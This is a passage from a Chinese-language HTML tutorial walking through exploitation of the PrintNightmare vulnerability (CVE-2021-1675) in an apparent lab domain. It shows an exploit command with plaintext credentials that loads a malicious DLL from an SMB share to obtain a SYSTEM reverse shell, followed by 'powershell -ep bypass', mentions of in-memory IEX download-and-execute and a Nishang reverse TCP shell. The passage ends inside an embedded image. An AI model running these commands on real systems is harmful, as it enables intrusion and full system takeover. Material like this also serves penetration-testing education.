d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173824125-1159154478-1829e7257518fd7bacef915c29005d82.png" width="584" height="178" class="img_ev3q"></p>
<p>这会将共享文件夹命名为 &#x27;share&#x27;，这意味着我们的 DLL 可以以 <code>\\IP\share\nightmare64.dll</code>这种方式访问。</p>
<p>一切准备就绪，我们就可以开始下面介绍的利用操作了。</p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="13利用-cve-2021-1675py"><strong><div id="id1.3">1.3、利用 CVE-2021-1675.py</div></strong><a href="#13利用-cve-2021-1675py" class="hash-link" aria-label="13利用-cve-2021-1675py的直接链接" title="13利用-cve-2021-1675py的直接链接">​</a></h4>
<p>首先，我们需要在攻击者计算机上启动 443 端口的监听器，因为这也是 DLL 反向连接所选择的端口。接着，就可以使用以下命令来利用 print spooler 服务了：</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">python3 CVE-2021-1675.py juggernaut.local/cmarko:&#x27;N0cturn@l21&#x27;@172.16.1.50 &#x27;\\172.16.1.30\share\nightmare64.dll&#x27;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173823719-27620289-0bd9b43dfcd77c0964764d21d5c34948.png" width="844" height="222" class="img_ev3q"></p>
<p>可以看到利用程序正在开始做一些事情。</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173823921-2129218878-88ba700fb5bb4b83ffe65c1b36191757.png" width="575" height="332" class="img_ev3q"></p>
<p>然后回到我们的监听器，可以看到一个 SYSTEM shell 已经建立成功！</p>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173823124-899477567-816ff94503263b704052a7ad942f9bdf.png" width="494" height="186" class="img_ev3q"></p>
<h2 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="2cve-2021-1675--printnightmare-lpe本地权限提升"><strong><div id="id2">2、CVE-2021-1675 – PrintNightmare LPE（本地权限提升）</div></strong><a href="#2cve-2021-1675--printnightmare-lpe本地权限提升" class="hash-link" aria-label="2cve-2021-1675--printnightmare-lpe本地权限提升的直接链接" title="2cve-2021-1675--printnightmare-lpe本地权限提升的直接链接">​</a></h2>
<p>上面的 RCE 示例结束后，现在来看看我们如何使用两种不同的工具在本地利用这一漏洞。</p>
<p>首先，我们将编译并使用 SharpPrintNightmare.exe 再次执行恶意 DLL。其次，我们将探索使用 PowerShell 脚本来利用该服务并创建一个新的管理员用户。而在 PowerShell 示例中，将使用 Invoke-Expression (IEX) cmdlet 直接将脚本下载到内存中并执行（注：又叫文件不落地执行）。</p>
<blockquote>
<p>对于此示例，假设我们无法提供任何用户凭据，但是能够利用一个 Web 漏洞获得一个 cmarko 普通用户身份的 shell。这意味着我们获得了立足点，但是不知道用户的密码。</p>
</blockquote>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173824048-319018422-a493163a0e5b4f8a4ec321ccc933abd6.png" width="488" height="177" class="img_ev3q"></p>
<h4 class="anchor anchorWithHideOnScrollNavbar_WYt5" id="21本地枚举-print-spooler-服务"><strong><div id="id2.1">2.1、本地枚举 Print Spooler 服务</div></strong><a href="#21本地枚举-print-spooler-服务" class="hash-link" aria-label="21本地枚举-print-spooler-服务的直接链接" title="21本地枚举-print-spooler-服务的直接链接">​</a></h4>
<p>在开始枚举服务之前，我们希望跳转到 PowerShell shell 中去。【虽然并不是必须要跳转到 powershell 中才能进行枚举，但为后文要频繁使用 powershell 做准备，先提前熟悉下。】</p>
<p>要跳转到 PowerShell shell，可以简单地在当前 shell 中使用以下命令【注：这通常可能会导致 cmd shell 挂起或卡死。】：</p>
<div class="language-cmd codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cmd codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">powershell -ep bypass</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="/web/assets/images/1503193-20250305173824018-1382222429-aa45908f07b7ea19f66307096d225cd4.png" width="479" height="118" class="img_ev3q"></p>
<blockquote>
<p>如果上述命令不起作用，导致 cmd shell 挂起或卡死，则可以使用 <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener noreferrer">Nishang</a> 的反向 TCP 脚本以将 cmd shell 升级到 powershell shell；亦或使用 <code>powershell -c “command”</code> 的方式去执行 PowerShell 的 cmdlet 命令。</p>
</blockquote>
<p>在 PowerShell shell 中，可以使用以下命令轻松枚举打印服务是否正在运行：</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Get-Service &quot;Spooler&quot;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p><img decoding="async" loading="lazy" src="data:image/png;base64,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